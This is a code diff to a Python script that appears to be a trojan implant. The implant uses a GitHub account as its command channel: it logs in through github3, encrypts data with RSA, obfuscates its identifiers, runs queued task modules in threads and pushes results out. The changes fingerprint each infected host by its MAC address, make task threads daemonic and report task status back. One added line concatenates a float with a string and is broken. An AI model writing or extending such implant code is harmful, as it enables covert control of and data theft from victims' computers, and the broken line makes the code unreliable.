@@ -10,6 +10,7 @@ import zipfile
 import StringIO
 import Queue
 import xxhash
+from uuid import getnode as get_mac
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
 from github3 import login
@@ -43,8 +44,7 @@ class Config:
 
 	#generates a new id by hashing time and seed
 	def u_id(self):
-		i_time = int(time.time())
-		t_id = str(i_time) + self.g_id_s()
+		t_id = str(get_mac()) + self.g_id_s() #id based on mac or is random
 		self.id = str(xxhash.xxh64(t_id).hexdigest())
 		self.id = self.obfstr(self.id)
 
@@ -291,17 +291,18 @@ def run_module(**task):
 			if result is not None:
 				push_data(result)
 			else:
-				push_data(config.g_com())
+				s = time.time() + ":" + task[config.g_fn_s()]
+				push_data(s)
 			return
 		except:
 			time.sleep(config.sleep)
-	return
 
 #runs all queued modules in new threads
 def module_runner():
 	while not config.tasks.empty():
 		task = config.tasks.get()
 		t = threading.Thread(target=run_module, kwargs = task)
+		t.daemon = True
 		t.start()
 		try:
 			time.sleep(int(task[config.g_id_s()]))
